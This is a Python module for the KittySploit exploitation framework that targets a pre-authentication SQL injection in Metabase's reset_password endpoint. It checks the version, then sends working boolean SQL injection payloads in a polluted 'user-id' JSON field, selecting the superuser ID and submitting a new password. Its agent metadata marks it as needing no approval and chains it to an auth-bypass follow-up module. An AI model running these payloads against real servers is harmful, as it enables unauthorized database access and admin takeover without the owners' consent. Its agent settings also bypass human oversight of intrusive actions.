#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""GHSA-vwf4-m7j8-wcjf — Metabase pre-auth SQLi via reset_password user-id pollution."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


_FIXED_MINOR = {58: 24, 59: 21, 60: 17, 61: 11, 62: 9, 63: 5}


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Metabase reset_password SQLi (GHSA-vwf4-m7j8-wcjf)",
        "description": (
            "Detects Metabase >= v0.58.0 before x.58.24 / x.59.21 / x.60.17 / x.61.11 / "
            "x.62.9 / x.63.5 affected by GHSA-vwf4-m7j8-wcjf: pre-authentication SQL "
            "injection in POST /api/session/reset_password via HoneySQL raw-map in the "
            "user-id JSON key (mass parameter pollution)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "tags": [
            "web",
            "scanner",
            "metabase",
            "sqli",
            "unauthenticated",
            "ghsa-vwf4-m7j8-wcjf",
            "vuln",
        ],
        "references": [
            "https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf",
        ],
        "modules": [
            "auxiliary/admin/http/metabase_ghsa_vwf4_m7j8_wcjf_auth_bypass",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["metabase"],
                "endpoint_pattern_any": ["/api/session/reset_password"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "reset_password user-id raw-map"},
                    {"capability": "admin_surface", "from_detail": "admin session side-effect"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/admin/http/metabase_ghsa_vwf4_m7j8_wcjf_auth_bypass",
                ],
            },
        },
    }

    port = OptPort(3000, "Metabase HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _parse_version_tag(tag: str):
        parts = str(tag or "").lstrip("v").split(".")
        if len(parts) < 2:
            return None, None
        try:
            major = int(parts[1]) if len(parts) >= 3 else int(parts[0])
            minor = int(parts[2]) if len(parts) >= 3 else 0
        except (ValueError, IndexError):
            return None, None
        return major, minor

    @staticmethod
    def _version_is_vulnerable(tag: str) -> bool:
        major, minor = Module._parse_version_tag(tag)
        if major is None or major < 58:
            return False
        fixed = _FIXED_MINOR.get(major)
        if fixed is not None and minor >= fixed:
            return False
        return True

    def _fetch_version(self):
        response = self.http_request(
            method="GET",
            path=self._api("/api/session/properties"),
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )
        if not response or response.status_code != 200:
            return None, response
        body, err = parse_json_response(response)
        if err or not body:
            return None, response
        tag = (body.get("version") or {}).get("tag", "")
        return tag or None, response

    def _inject_sql(self, raw_sql: str, password: str = "Kittysploit_Poc_9!"):
        payload = {
            "token": "1_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            "password": password,
            "user-id": {"raw": raw_sql},
        }
        return self.http_request(
            method="POST",
            path=self._api("/api/session/reset_password"),
            json=payload,
            headers={"Content-Type": "application/json"},
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )

    def run(self):
        version, props_resp = self._fetch_version()
        if not version:
            code = getattr(props_resp, "status_code", "?")
            return False

        if not self._version_is_vulnerable(version):
            return False

        true_sql = (
            "CASEWHEN(1=1, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)"
        )
        false_sql = (
            "CASEWHEN(1=0, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)"
        )

        true_resp = self._inject_sql(true_sql)
        false_resp = self._inject_sql(false_sql)

        if not true_resp or not false_resp:
            return False

        true_body = (true_resp.text or "").strip()
        false_body = (false_resp.text or "").strip()

        # Vulnerable instances accept the polluted user-id object and return HTTP 400.
        if true_resp.status_code != 400 or false_resp.status_code != 400:
            return False

        # Boolean confirmation: admin-resolving vs empty-resolving payloads differ.
        if true_body == false_body:
            self.set_info(
                severity="high",
                reason=(
                    f"Metabase {version} in vulnerable version range; "
                    "reset_password accepts user-id raw-map (boolean SQLi inconclusive)"
                ),
                path=self._api("/api/session/reset_password"),
                version=version,
            )
            return True

        self.set_info(
            severity="critical",
            reason=(
                f"Metabase {version} — pre-auth SQLi confirmed via boolean "
                "reset_password user-id pollution"
            ),
            path=self._api("/api/session/reset_password"),
            version=version,
        )
        return True
